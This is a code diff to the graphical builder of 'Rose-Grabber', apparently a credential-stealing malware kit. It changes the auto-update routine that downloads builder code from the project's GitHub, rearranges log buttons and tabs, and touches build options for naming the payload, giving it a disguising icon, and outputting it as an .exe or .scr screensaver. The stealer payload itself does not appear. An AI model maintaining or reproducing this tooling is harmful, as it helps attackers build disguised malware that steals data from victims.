@@ -112,7 +112,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/v8.pyw"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/builder.py"
     )
     
     code = requests.get(_code, timeout=10).text
@@ -530,12 +530,12 @@ def _home():
             placeholder='Rose on top baby',
             on_change=lambda e: change_data("build_name", e.value)
         ).props('inline color=pink-3').classes('w-full')
-        ui.select(
+        choose_file_icon = ui.select(
             label='File icon',
             options=['Windows Exe', 'Use Custom'],
             on_change=lambda e: change_data("icon_file", e.value)
         ).props('inline color=pink-3').classes('w-full')
-        ui.button('Set custom file icon', on_click=select_icon)
+        ui.button('Set custom file icon', on_click=select_icon).props("icon=code color=purple-11").bind_visibility_from(choose_file_icon, 'value')
         ui.select(
             label='Returned file type',
             options=["Executable (.exe)", "Screensaver (.scr)"],#, "Batch (.bat)", "PowerShell (.ps1)", "Visual Basic Script (.vbs)"],
@@ -562,8 +562,6 @@ def _home():
 
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
         might_take = ui.label("Some steps in the process may take a few minutes, so please be patient :)")
-        ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
-        ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
         progressbar.visible = False
         might_take.visible = False
 
@@ -639,6 +637,10 @@ def _functions():
 
 def _github():
     with ui.card():
+        with ui.row():
+            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
+            ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
+        
         with ui.column():
             ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
             with ui.row():
@@ -679,21 +681,18 @@ ui.colors(primary='#333')
 def superhome():
     ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/%24rose-wh.png').style(
         'position: absolute; top: 3px; left: 575px; width: 90px;'
-        )        
-
-
-
+        )    
     with ui.tabs().classes('w-full center') as tabs:
         ui.tab('Home', icon='home')
         ui.tab('Functions', icon='fingerprint')
-        ui.tab('Socials', icon='face')
+        ui.tab('Settings', icon='face')
 
     with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
         with ui.tab_panel('Home'):
             _home()
         with ui.tab_panel('Functions'):
             _functions()
-        with ui.tab_panel('Socials'):
+        with ui.tab_panel('Settings'):
             _github()
 
 v = ui.video('https://github.com/DamagingRose/Rose-Grabber/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
